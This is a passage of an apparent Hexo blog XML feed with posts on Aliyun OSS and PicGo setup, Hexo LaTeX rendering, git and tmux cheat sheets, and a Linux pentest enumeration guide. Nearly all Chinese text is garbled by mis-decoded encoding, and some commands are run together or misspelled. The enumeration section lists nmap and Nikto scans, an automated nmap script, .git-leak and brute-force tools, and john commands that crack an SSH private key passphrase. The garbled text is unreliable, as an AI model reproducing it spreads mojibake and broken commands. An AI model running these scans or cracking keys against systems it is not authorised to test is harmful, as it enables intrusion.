<p>é€‰æ‹©<code>è®¤è¯ç®¡ç†</code>ï¼Œç‚¹å‡»æœ€ä¸‹é¢çš„<code>åˆ›å»ºæ–°çš„AccessKey</code>ï¼Œä¼šç”Ÿæˆ<code>AccessKeyID</code>å’Œ<code>AccessKeySecret</code>ï¼Œ<code>AccessKeySecret</code>æ˜¯æ— æ³•æ‰¾å›çš„ï¼Œæ‰€ä»¥ä¸€å®šè¦ä¿å­˜å¥½ã€‚</p>
<h2 id="åˆ›å»ºBucket">åˆ›å»ºBucket</h2>
<p>è¿›å…¥OSSæ§åˆ¶å°ï¼š<a href="https://oss.console.aliyun.com/overview">https://oss.console.aliyun.com/overview</a></p>
<p>ç‚¹å‡»åŠ å·ï¼Œåˆ›å»ºBucketã€‚</p>
<p><strong>æ³¨æ„ï¼š</strong></p>
<blockquote>
<ol>
<li>Bucketåç§°è¦å…¨å±€å”¯ä¸€</li>
<li>åŒºåŸŸæœ€å¥½é€‰æ‹©ç¦»ä½ è¿‘çš„</li>
<li>æƒé™é€‰æ‹©å…¬å…±è¯»ï¼Œè¿™æ ·å­å›¾ç‰‡åˆ«äººæ‰èƒ½è®¿é—®å¾—åˆ°</li>
</ol>
</blockquote>
<h2 id="å®‰è£…OSS-Browserå®¢æˆ·ç«¯">å®‰è£…OSS Browserå®¢æˆ·ç«¯</h2>
<p>OSS Browseræ˜¯é˜¿é‡Œäº‘å®˜æ–¹çš„å®¢æˆ·ç«¯å·¥å…·ï¼Œå¯ä»¥ä½¿ç”¨æ‹¥æœ‰OSSæƒé™çš„ç”¨æˆ·ç™»å½•ï¼Œä»è€Œå…å»ç™»å½•å®˜ç½‘æ§åˆ¶å°çš„éº»çƒ¦ã€‚</p>
<ul>
<li><code>OSS Browser</code> Windows64ä¸‹è½½åœ°å€ï¼š</li>
</ul>
<blockquote>
<p><a href="http://gosspublic.alicdn.com/oss-browser/1.9.4/oss-browser-win32-x64.zip">http://gosspublic.alicdn.com/oss-browser/1.9.4/oss-browser-win32-x64.zip</a></p>
</blockquote>
<ul>
<li>OSSå¸¸ç”¨å·¥å…·æ±‡æ€»ï¼š</li>
</ul>
<blockquote>
<p><a href="https://help.aliyun.com/document_detail/44075.html">https://help.aliyun.com/document_detail/44075.html</a></p>
</blockquote>
<p>å®‰è£…å®Œæˆä¹‹åï¼Œè¾“å…¥<code>AccessKey</code>ã€<code>AccessKeySecret</code>ç™»å½•å³å¯ï¼Œå…¶ä»–éƒ½æ˜¯å¯é€‰é¡¹ã€‚</p>
<p>å¯ä»¥æ–°å»ºBucketã€ä¸Šä¼ æ–‡ä»¶ã€ä¸Šä¼ æ–‡ä»¶å¤¹ç­‰ç­‰ã€‚</p>
<h2 id="å®‰è£…PicGo">å®‰è£…PicGo</h2>
<p>PicGoæ˜¯ä¸€ä¸ªæ”¯æŒå¤šç§å›¾åºŠçš„å®¢æˆ·ç«¯å›¾ç‰‡ä¸Šä¼ å·¥å…·ï¼Œå¯ä»¥å®ç°å¿«é€Ÿä¸Šä¼ å›¾ç‰‡åˆ°æŒ‡å®šå›¾åºŠï¼Œå¹¶å°†é“¾æ¥ä¿å­˜åˆ°å‰ªè´´æ¿ã€‚</p>
<ul>
<li>GitHubåœ°å€ï¼š</li>
</ul>
<blockquote>
<p><a href="https://github.com/Molunerfinn/PicGo">https://github.com/Molunerfinn/PicGo</a></p>
</blockquote>
<ul>
<li>Releaseåœ°å€ï¼š</li>
</ul>
<blockquote>
<p><a href="https://github.com/Molunerfinn/PicGo/releases">https://github.com/Molunerfinn/PicGo/releases</a></p>
</blockquote>
<p>Windowsçš„ä¸‹è½½<a href="https://github.com/Molunerfinn/PicGo/releases/download/v2.1.2/picgo-setup-2.1.2.exe">picgo-setup-2.1.2.exe</a>ä¸‹è½½å®‰è£…å³å¯</p>
<p>è®¾ç½®å‚è€ƒå›¾ç‰‡å³å¯ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191018221456.png" alt=""></p>
<blockquote>
<p><strong>è¿™é‡Œæœ€å‘çš„åœ°æ–¹å°±åœ¨äº<code>ç¡®å®šå­˜å‚¨åŒºåŸŸ</code>è¿™ä¸€é¡¹ï¼Œå¹¶ä¸æ˜¯OSSæ§åˆ¶å°ä¸­çš„<code>Endpoint</code>å¤–ç½‘è®¿é—®çš„å…¨éƒ¨åœ°å€ï¼Œè€Œæ˜¯<code>.aliyuncs.com</code>å‰é¢çš„å€¼ï¼ï¼ï¼</strong></p>
</blockquote>
<p>è®¾å®šè‡ªå®šä¹‰åŸŸååï¼Œç”Ÿæˆçš„é“¾æ¥ä¼šè‡ªåŠ¨ç”¨è‡ªå®šä¹‰çš„åŸŸåæ›¿æ¢ã€‚</p>
<p>å½“ä½¿ç”¨æˆªå›¾å·¥å…·æˆªå›¾åï¼Œä¼šä¿å­˜åˆ°å‰ªè´´æ¿ï¼Œè¿™æ—¶æŒ‰ä¸‹å¿«æ·é”®ï¼ŒPicGoå°±ä¼šè‡ªåŠ¨ä¸Šä¼ å›¾ç‰‡ï¼Œç„¶åå°†æŒ‡å®šæ ¼å¼çš„é“¾æ¥åœ°å€æ”¾åˆ°å‰ªè´´æ¿ï¼Œç›´æ¥ç²˜è´´åˆ°Markdownæ–‡æ¡£å³å¯ã€‚</p>
<p>ç‚¹å‡»å³ä¸Šè§’çš„â•ï¼Œä¼šå˜æˆæµ®çª—ï¼Œå°†å›¾ç‰‡ç›´æ¥æ‹–åˆ°æµ®çª—å°±èƒ½ä¸Šä¼ ã€‚</p>
]]></content>
      <categories>
        <category>æŠ€æœ¯éšç¬”</category>
      </categories>
      <tags>
        <tag>OSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexoæ¸²æŸ“LaTeXæ•°å­¦å…¬å¼</title>
    <url>/Other/3.Hexo%E6%B8%B2%E6%9F%93LaTeX%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="Hexoæ¸²æŸ“LaTeXæ•°å­¦å…¬å¼">Hexoæ¸²æŸ“LaTeXæ•°å­¦å…¬å¼</h1>
<p>æœ€è¿‘åœ¨è·Ÿç€å´æ©è¾¾æ•™æˆåœ¨Courseraç½‘ç«™ä¸Šçš„è¯¾ç¨‹å­¦ä¹ æœºå™¨å­¦ä¹ ï¼Œå…¶ä¸­æ¶‰åŠåˆ°çš„å…¬å¼æ¯”å¤šï¼ŒåŒ…æ‹¬çº¿æ€§ä»£æ•°å’Œå¾®åˆ†ã€‚è¿™é‡ŒåŸºäº Hexo ä»‹ç»å¦‚ä½•åœ¨åšå®¢ä¸Šè¿›è¡Œ LaTeX å…¬å¼çš„ç¼–å†™å’Œæ¸²æŸ“ã€‚</p>
<h3 id="åœ¨-Hexo-ä¸­é…ç½®-MathJax">åœ¨ Hexo ä¸­é…ç½® MathJax</h3>
<h4 id="ç¯å¢ƒé…ç½®">ç¯å¢ƒé…ç½®</h4>
<p>Hexo ä¸­å¯¹ç½‘é¡µè¿›è¡Œæ¸²æŸ“çš„ marked å¹¶ä¸æ”¯æŒ mathjaxï¼Œæˆ‘ä»¬ç”¨ Git Bash è¿›å…¥åšå®¢å·¥ç¨‹æ‰€åœ¨çš„æ–‡ä»¶å¤¹ä¸‹å¹¶æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-renderer-marked --savenpm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure>
<h4 id="åœæ­¢-hexo-math">åœæ­¢ hexo-math</h4>
<p>å¸è½½å¯èƒ½å®‰è£…çš„ <code>hexo-math</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-math --save</span><br></pre></td></tr></table></figure>
<p>å†å®‰è£… <code>hexo-renderer-mathjax</code> åŒ…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-rederer-mathjax</span><br></pre></td></tr></table></figure>
<h4 id="æ›´æ–°-mathjax-çš„-CDN-è¿æ¥">æ›´æ–° mathjax çš„ CDN è¿æ¥</h4>
<p>æŒ‰ç…§ <code>node_modules</code> â†’â†’ <code>hexo-renderer-mathjax</code> çš„é¡ºåºè¿›å…¥ç›®å½•ï¼Œå¯¹ <code>mathjax.html</code> æ–‡æ¡£è¿›è¡Œä¿®æ”¹ï¼ŒæŠŠ `` æ”¹ä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;mathjax&#x2F;2.7.1&#x2F;MathJax.js?config&#x3D;TeX-MML-AM_CHTML&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<h4 id="æ›´æ”¹é»˜è®¤çš„è½¬ä¹‰è§„åˆ™">æ›´æ”¹é»˜è®¤çš„è½¬ä¹‰è§„åˆ™</h4>
<p>å› ä¸º Hexo åœ¨å¤„ç†ç‰¹æ®Šå­—ç¬¦æ—¶ä¼šå¯¹æŸäº›å­—ç¬¦è½¬ä¸º html ä¸­çš„ç½‘é¡µæ ‡ç­¾ï¼Œæˆ‘ä»¬æŒ‰ç…§ <code>node_modules</code> â†’â†’ <code>kramed</code> â†’â†’ <code>lib</code> â†’â†’ <code>rules</code> çš„é¡ºåºè¿›å…¥ç›®å½•å¹¶ä¿®æ”¹ <code>inline.js</code> ï¼Œå°†å…¶ä¸­çš„ä¸¤è¡Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">escape: &#x2F;^\\([\\&#96;*&#123;&#125;\[\]()#$+\-.!_&gt;])&#x2F;,em: &#x2F;^\b_((?:__|[\s\S])+?)_\b|^\*((?:\*\*|[\s\S])+?)\*(?!\*)&#x2F;,</span><br></pre></td></tr></table></figure>
<p>å¯¹åº”ä¿®æ”¹ä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">escape: &#x2F;^\\([&#96;*\[\]()#$+\-.!_&gt;])&#x2F;,em: &#x2F;^\*((?:\*\*|[\s\S])+?)\*(?!\*)&#x2F;,</span><br></pre></td></tr></table></figure>
<h4 id="å¼€å¯-mathjax">å¼€å¯ mathjax</h4>
<p>è¿›å…¥å·¥ç¨‹ç›®å½•çš„ä¸»é¢˜æ–‡ä»¶å¤¹ä¸‹ï¼Œæ‰¾åˆ° <code>_config.yml</code> æ–‡ä»¶å¹¶å¼€å¯ mathjaxï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mathjax: 	</span><br><span class="line">  enable: true</span><br></pre></td></tr></table></figure>
<p>åœ¨æˆ‘ä»¬æ¯ä¸€æ¬¡ä½¿ç”¨ <code>Git Bash</code> åˆ›å»ºåšå®¢æ–‡ç« åï¼ŒHexo éƒ½ä¼šè‡ªåŠ¨ä¸ºæˆ‘ä»¬ç”Ÿæˆå¤´éƒ¨ä¿¡æ¯ï¼Œæˆ‘ä»¬åœ¨éœ€è¦æ’å…¥ LaTeX å…¬å¼çš„åšå®¢çš„å¤´éƒ¨åŠ ä¸Š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mathjax: true</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åœ¨åšå®¢ä¸­ç¼–å†™æ•°å­¦å…¬å¼äº†ã€‚</p>
]]></content>
      <categories>
        <category>æŠ€æœ¯éšç¬”</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>gitå¸¸ç”¨å‘½ä»¤æ€ç»´å¯¼å›¾</title>
    <url>/Other/4.git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/</url>
    <content><![CDATA[<h1 id="Git-Sheatcheat">Git Sheatcheat</h1>
<p>â€”â€”æ¬è¿è‡ªhttps://www.zhihu.com/answer/975066538</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/git.jpg" alt=""></p>
]]></content>
      <categories>
        <category>æŠ€æœ¯éšç¬”</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>Tmuxå¿«æ·é”®å¤‡å¿˜å½•</title>
    <url>/Other/5.Tmux%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%A4%87%E5%BF%98%E5%BD%95/</url>
    <content><![CDATA[<h1 id="Tmux-Cheatsheet">Tmux Cheatsheet</h1>
<p>oh-my-tmuxï¼š<a href="https://github.com/gpakosz/.tmux">https://github.com/gpakosz/.tmux</a></p>
<ul>
<li><code>&lt;prefix&gt;</code> = Ctrl + a æˆ– Ctrl + b</li>
<li><code>&lt;prefix&gt; c</code> =  Ctrl + a (or Ctrl + b)  + c</li>
<li><code>&lt;prefix&gt; C-c</code> = Ctrl + a (or Ctrl + b) Ctrl + c</li>
</ul>
<p>tmuxå‘½ä»¤ï¼š</p>
<ul>
<li><code>tmux detach</code> æˆ– <code>&lt;preifx&gt; d</code> åˆ†ç¦»å½“å‰session</li>
<li><code>tmux ls</code> æŸ¥çœ‹æ‰€æœ‰session</li>
<li><code>tmux attach -t 0</code> æ ¹æ®session idæ¥å…¥æŸä¸ªsession</li>
<li><code>tmux kill-session -t 0</code> æ ¹æ®session idæ€æ­»æŸä¸ªsession</li>
</ul>
<p>tmuxå¿«æ·é”®ï¼š</p>
<ul>
<li><code>&lt;prefix&gt; e</code> ä¿®æ”¹<code>~/.tmux.conf.local</code></li>
<li><code>&lt;prefix&gt; r</code> é‡æ–°è½½å…¥é…ç½®æ–‡ä»¶</li>
<li><code>&lt;prefix&gt; C-l</code> clears both the screen and the tmux history</li>
<li><code>&lt;prefix&gt; C-c</code> æ–°å»ºsession</li>
<li><code>&lt;prefix&gt; C-f</code> æ ¹æ®session_nameåˆ‡æ¢session</li>
<li><code>&lt;prefix&gt; s</code> åˆ—å‡ºæ‰€æœ‰session</li>
<li><code>&lt;prefix&gt; c</code> æ–°å»ºwindow</li>
<li><code>&lt;prefix&gt; C-h</code> and <code>&lt;prefix&gt; C-l</code> å‘å‰ã€å‘ååˆ‡æ¢window</li>
<li><code>&lt;prefix&gt; Tab</code> åˆ‡æ¢ä¸Šä¸€ä¸ªæ´»åŠ¨window</li>
<li><code>&lt;prefix&gt; |</code> å‚ç›´åˆ†å‰²panes</li>
<li><code>&lt;prefix&gt; _</code> æ°´å¹³åˆ†å‰²panes</li>
<li><code>&lt;prefix&gt; h</code>, <code>&lt;prefix&gt; j</code>, <code>&lt;prefix&gt; k</code> and <code>&lt;prefix&gt; l</code> å…‰æ ‡åˆ‡æ¢åˆ°å…¶ä»–panesï¼Œç±»ä¼¼Vim</li>
<li><code>&lt;prefix&gt; H</code>, <code>&lt;prefix&gt; J</code>, <code>&lt;prefix&gt; K</code>, <code>&lt;prefix&gt; L</code> let you resize panes</li>
<li><code>&lt;prefix&gt; &lt;</code> and <code>&lt;prefix&gt; &gt;</code> äº¤æ¢panesä½ç½®</li>
<li><code>&lt;prefix&gt; +</code> å½“å‰paneså…¨å±æ˜¾ç¤ºï¼Œå†ä½¿ç”¨ä¸€æ¬¡ä¼šå˜å›åŸæ¥å¤§å°</li>
<li><code>&lt;prefix&gt; m</code> æ˜¯å¦å¯ç”¨é¼ æ ‡æ¨¡å¼</li>
<li><code>&lt;prefix&gt; U</code> launches Urlview (if available)</li>
<li><code>&lt;prefix&gt; F</code> launches Facebook PathPicker (if available)</li>
<li><code>&lt;prefix&gt; Enter</code> è¿›å…¥å¤åˆ¶æ¨¡å¼</li>
<li><code>&lt;prefix&gt; b</code> åˆ—å‡ºå‰ªåˆ‡æ¿ä¸­çš„å†…å®¹</li>
<li><code>&lt;prefix&gt; p</code> ç²˜è´´å‰ªåˆ‡æ¿ä¸­çš„ç¬¬ä¸€æ¡å†…å®¹</li>
<li><code>&lt;prefix&gt; P</code> ä»å‰ªåˆ‡æ¿ä¸­é€‰æ‹©å†…å®¹ç²˜è´´</li>
</ul>
]]></content>
      <categories>
        <category>æŠ€æœ¯éšç¬”</category>
      </categories>
      <tags>
        <tag>Tmux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux-Enumeration</title>
    <url>/Other/6.Linux-Enumeration/</url>
    <content><![CDATA[<blockquote>
<p>æ›´æ–°ä¸­â€¦</p>
</blockquote>
<h1 id="Linux-Enumeration">Linux Enumeration</h1>
<h2 id="ä¿¡æ¯æœé›†">ä¿¡æ¯æœé›†</h2>
<h3 id="Nmap">Nmap</h3>
<p>ä½¿ç”¨æ‰‹å†Œï¼š<a href="https://www.stationx.net/nmap-cheat-sheet/">https://www.stationx.net/nmap-cheat-sheet/</a></p>
<h4 id="å¸¸ç”¨å‚æ•°">å¸¸ç”¨å‚æ•°</h4>
<p>Target Selection:</p>
<p><strong>nmap 192.168.0.1</strong>(scanning a single ip address)<br>
<strong>nmap ca0y1h.top</strong>(scanning an url directly)<br>
<strong>nmap 192.168.0.0/24</strong>(scan a range of IPs (192.168.0.0-255))<br>
<strong>nmap -iL list-of-ips.txt</strong>(scan a list of ip)</p>
<p>Port Selection:</p>
<p><strong>nmap 127.0.0.1 -p 22</strong>(scanning the default SSH port)<br>
<strong>nmap 127.0.0.1 -p 1-1024</strong>(scanning ports 1 2 3â€¦1024)<br>
<strong>nmap 127.0.0.1 -F</strong>(scanning the most 100 common ports (80,22,21,443,etc))<br>
<strong>nmap 127.0.0.1 -F --top-ports 30000</strong><br>
<strong>nmap 127.0.0.1 -p-</strong>(all ports)</p>
<p>Port Scan Types:</p>
<p><strong>nmap 127.0.0.1 -sT</strong> (using TCP (used by default))<br>
<strong>nmap 127.0.0.1 -sS</strong> (TCP SYN scan)<br>
<strong>nmap 127.0.0.1 -sU</strong> (UDP ports)<br>
<strong>nmap 127.0.0.1 -Pn -F</strong> (skip the initial ping step)</p>
<p>Service &amp; OS Detection</p>
<p><strong>nmap 127.0.0.1 -A</strong>(detect OS &amp; services)<br>
<strong>nmap 127.0.0.1 -sV</strong>(enumerate versions)<br>
<strong>nmap 127.0.0.1 -sC</strong>(using default scripts)<br>
<strong>nmap 127.0.0.1 -sV --version-intensity 5</strong>(Aggressive service detection)<br>
<strong>nmap 127.0.0.1 -sV --version-intensity 0</strong>(Light banner grabbing detection)</p>
<p><strong>nmap 127.0.0.1 -T0</strong>(paranoid detection evasion)<br>
<strong>nmap 127.0.0.1 -T1</strong>(sneaky detection evasion)<br>
<strong>nmap 127.0.0.1 -T2</strong>(polite (slows down scan, less bandwidth &amp; less target ressources))<br>
<strong>nmap 127.0.0.1 -T3</strong>(default speed)<br>
<strong>nmap 127.0.0.1 -T4</strong>(Aggressive (fast &amp; reliable network))<br>
<strong>nmap 127.0.0.1 -T5</strong>(Insane speeds (assumes low ping and high bandwidth))</p>
<p><strong>nmap 127.0.0.1 --host-timeout 1h 2m 3s</strong>(sets timeout to 1hr2min3sec)<br>
<strong>nmap 127.0.0.1 --min-parallelism 10</strong>(minimal probe parallelization)<br>
<strong>nmap 127.0.0.1 --max-parallelism 50</strong>(maximal ^)<br>
<strong>nmap 127.0.0.1 --max-retries 3</strong><br>
<strong>nmap 127.0.0.1 --min-rate</strong> (send packets at least _ per second)</p>
<h4 id="Python-Script-Scan">Python Script Scan</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line"></span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">ip &#x3D; input(&quot;[+]Target IP: &quot;)</span><br><span class="line"></span><br><span class="line">ippsec &#x3D; &quot;ippsec_scan.txt&quot;</span><br><span class="line">service &#x3D; &quot;service_scan.txt&quot;</span><br><span class="line">script &#x3D; &quot;script_scan.txt&quot;</span><br><span class="line">all_tcp &#x3D; &quot;all_tcp_scan.txt&quot;</span><br><span class="line">all_udp &#x3D; &quot;all_tcp_scan.txt&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def ippsec_scan(ip):</span><br><span class="line">    print(&quot;[!] Starting ippsec_scan &quot;)</span><br><span class="line">    subprocess.run([&quot;nmap&quot;, &quot;-sC&quot;, &quot;-sV&quot;, &quot;-oN&quot;, ippsec, ip])</span><br><span class="line">    print(&quot;[+] Done &quot;)</span><br><span class="line"></span><br><span class="line">def service_scan(ip):</span><br><span class="line">    print(&quot;[!] Starting service_scan &quot;)</span><br><span class="line">    subprocess.run([&quot;nmap&quot;, &quot;-A&quot;, &quot;-p-&quot;, &quot;-oN&quot;, service, ip])</span><br><span class="line">    print(&quot;[+] Done &quot;)</span><br><span class="line"></span><br><span class="line">def script_scan(ip):</span><br><span class="line">    print(&quot;[!] Starting script_scan &quot;)</span><br><span class="line">    subprocess.run([&quot;nmap&quot;, &quot;--script&quot;, &quot;discovery, safe, vuln&quot;, &quot;-oN&quot;, script, ip])</span><br><span class="line">    print(&quot;[+] Done &quot;)</span><br><span class="line"></span><br><span class="line">def alltcp_scan(ip):</span><br><span class="line">    print(&quot;[!] Starting all_tcp_scan &quot;)</span><br><span class="line">    subprocess.run([&quot;nmap&quot;, &quot;-p-&quot;, &quot;-oN&quot;, all_tcp, ip])</span><br><span class="line">    print(&quot;[+] Done &quot;)</span><br><span class="line"></span><br><span class="line">def alludp_scan(ip):</span><br><span class="line">    print(&quot;[!] Starting all_udp_scan &quot;)</span><br><span class="line">    subprocess.run([&quot;nmap&quot;, &quot;-p-&quot;, &quot;-sU&quot;, &quot;-oN&quot;, all_udp, ip])</span><br><span class="line">    print(&quot;[+] Done &quot;)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    ippsec_scan(ip)</span><br><span class="line">    service_scan(ip)</span><br><span class="line">    script_scan(ip)</span><br><span class="line">    alltcp_scan(ip)</span><br><span class="line">    alludp_scan(ip)</span><br></pre></td></tr></table></figure>
<h3 id="Netdiscover">Netdiscover</h3>
<h3 id="Nikto">Nikto</h3>
<p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a></p>
<p>å·¥å…·ä»‹ç»ï¼šperlè¯­è¨€å¼€å‘çš„å¼€æºWEBå®‰å…¨æ‰«æå™¨ï¼›è¯†åˆ«ç½‘ç«™è½¯ä»¶ç‰ˆæœ¬ï¼›æœç´¢å­˜åœ¨å®‰å…¨éšæ‚£çš„æ–‡ä»¶ï¼›æ£€æŸ¥æœåŠ¡å™¨é…ç½®æ¼æ´ï¼›æ£€æŸ¥WEB Applicationå±‚é¢çš„å®‰å…¨éšæ‚£ï¼›é¿å…404è¯¯åˆ¤ä¾æ®å“åº”æ–‡ä»¶å†…å®¹åˆ¤æ–­ï¼Œä¸åŒæ‰©å±•åçš„æ–‡ä»¶404å“åº”å†…å®¹ä¸åŒã€‚</p>
<p>å¸¸ç”¨å‘½ä»¤ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nikto -host http:&#x2F;&#x2F;1.1.1.1 #æ‰«æç›®æ ‡ï¼šåŸŸåæ–¹å¼ï¼›</span><br><span class="line">Nikto -host http:&#x2F;&#x2F;1.1.1.1 -output #æ‰«æå¹¶è¾“å‡ºç»“æœ</span><br><span class="line">Nikto -host 1.1.1.1 -port 80 #æ‰«æç›®æ ‡ï¼šipåœ°å€åŠ ç«¯å£å·</span><br><span class="line">Nikto -host www.baidu.com -port 443 -ssl #æ‰«æhttpsç½‘ç«™</span><br><span class="line">Nikto -host æ–‡ä»¶å.txt #æ‰¹é‡æ‰«æç›®æ ‡</span><br><span class="line">nmap -p80 192.168.1.0&#x2F;24 -oG - | nikto -host - #åˆ©ç”¨nmapæ‰«æå¼€æ”¾80ç«¯å£çš„IPæ®µå¹¶ä¸”oGï¼ˆnmapç»“æœè¾“å‡ºå¹¶æ•´ç†ï¼‰é€šè¿‡ç®¡é“çš„æ–¹å¼â€œ|â€ç”¨niktoè¿›è¡Œæ‰«æ</span><br><span class="line">nikto -host 192.168.0.1 -useproxy http:&#x2F;&#x2F;localhost:8070 #åˆ©ç”¨ä»£ç†è¿›è¡Œæ‰«æ</span><br><span class="line">-vhost #å½“ä¸€ä¸ªç½‘ç«™å­˜åœ¨å¤šä¸ªç«¯å£æ—¶å¯ä»¥ä½¿ç”¨-vhostéå†æ‰€æœ‰ç½‘ç«™è¿›è¡Œæ‰«ææˆ–ä¸€ä¸ªipå¯¹åº”å¤šä¸ªç½‘ç«™</span><br></pre></td></tr></table></figure>
<h3 id="GitHack">GitHack</h3>
<p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p>
<p>å·¥å…·ä»‹ç»ï¼šGitHackæ˜¯ä¸€ä¸ª.gitæ³„éœ²åˆ©ç”¨è„šæœ¬ï¼Œé€šè¿‡æ³„éœ²çš„.gitæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶ï¼Œé‡å»ºè¿˜åŸå·¥ç¨‹æºä»£ç ã€‚</p>
<p>æ¸—é€æµ‹è¯•äººå‘˜ã€æ”»å‡»è€…ï¼Œå¯ä»¥è¿›ä¸€æ­¥å®¡è®¡ä»£ç ï¼ŒæŒ–æ˜ï¼šæ–‡ä»¶ä¸Šä¼ ï¼ŒSQLæ³¨å°„ç­‰webå®‰å…¨æ¼æ´ã€‚</p>
<h3 id="dirb">dirb</h3>
<h3 id="Wfuzz">Wfuzz</h3>
<p>é¡¹ç›®åœ°å€ï¼š<a href="https://wfuzz.readthedocs.io/en/latest/">https://wfuzz.readthedocs.io/en/latest/</a></p>
<p>å·¥å…·ä»‹ç»ï¼šwfuzzæ˜¯ä¸€ä¸ªåŸºäºPythonçš„Webçˆ†ç ´ç¨‹åºï¼Œå®ƒæ”¯æŒå¤šç§æ–¹æ³•æ¥æµ‹è¯•WEBåº”ç”¨çš„æ¼æ´ã€‚ä½ å¯ä»¥å®¡è®¡å‚æ•°ã€ç™»å½•è®¤è¯ã€GET/POSTæ–¹å¼çˆ†ç ´çš„è¡¨å•ï¼Œå¹¶ä¸”å¯ä»¥å‘æ˜æœªå…¬å¼€çš„èµ„æºï¼Œæ¯”å¦‚ç›®å½•ã€æ–‡ä»¶å’Œå¤´éƒ¨ä¹‹ç±»çš„ã€‚</p>
<p>ä½¿ç”¨æ‰‹å†Œï¼š<a href="https://www.fuzzer.xyz/2019/03/29/WFUZZ%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">https://www.fuzzer.xyz/2019/03/29/WFUZZä½¿ç”¨æ•™ç¨‹/</a></p>
<h3 id="subDomainBrute">subDomainBrute</h3>
<p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></p>
<p>å·¥å…·ä»‹ç»ï¼šæœ¬å·¥å…·ç”¨äºæ¸—é€æµ‹è¯•ç›®æ ‡åŸŸåæ”¶é›†ã€‚é«˜å¹¶å‘DNSæš´åŠ›æšä¸¾ï¼Œå‘ç°å…¶ä»–å·¥å…·æ— æ³•æ¢æµ‹åˆ°çš„åŸŸå, å¦‚Googleï¼Œaizhanï¼Œfofaã€‚</p>
<h3 id="Pigat">Pigat</h3>
<p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/teamssix/pigat">https://github.com/teamssix/pigat</a></p>
<p>å·¥å…·ä»‹ç»ï¼šè¢«åŠ¨ä¿¡æ¯æ”¶é›†èšåˆå·¥å…·ï¼Œè¯¥å·¥å…·é€šè¿‡çˆ¬å–ç›®æ ‡URLåœ¨ç¬¬ä¸‰æ–¹ç½‘ç«™æ¯”å¦‚å¤‡æ¡ˆæŸ¥è¯¢ç½‘ç«™ã€å­åŸŸåæŸ¥è¯¢ç½‘ç«™çš„ç»“æœæ¥å¯¹ç›®æ ‡è¿›è¡Œè¢«åŠ¨ä¿¡æ¯æ”¶é›†ã€‚</p>
<h2 id="å¯†ç çˆ†ç ´">å¯†ç çˆ†ç ´</h2>
<h3 id="hash-identifier">hash-identifier</h3>
<p>é¡¹ç›®åœ°å€ï¼š<a href="https://tools.kali.org/password-attacks/hash-identifier">https://tools.kali.org/password-attacks/hash-identifier</a></p>
<p>å·¥å…·ä»‹ç»ï¼šhash-identifieræ˜¯ä¸€æ¬¾å“ˆå¸Œç®—æ³•è¯†åˆ«å·¥å…·ã€‚é€šè¿‡è¯¥å·¥å…·ï¼Œç”¨æˆ·å¯ä»¥è¯†åˆ«å“ˆå¸Œå€¼æ‰€ä½¿ç”¨çš„å“ˆå¸Œç®—æ³•ã€‚</p>
<h3 id="hashcat">hashcat</h3>
<h3 id="John-The-Ripper">John The Ripper</h3>
<p>é¡¹ç›®åœ°å€ï¼š<a href="https://www.openwall.com/john/">https://www.openwall.com/john/</a></p>
<p>ä½¿ç”¨ç¤ºä¾‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;john&#x2F;ssh2john.py id_rsa &gt; id_rsa.hash</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt id_rsa.hash</span><br></pre></td></tr></table></figure>
<h3 id="Hydra">Hydra</h3>
<p>é¡¹ç›®åœ°å€ï¼š<a href="https://tools.kali.org/password-attacks/hydra">https://tools.kali.org/password-attacks/hydra</a></p>
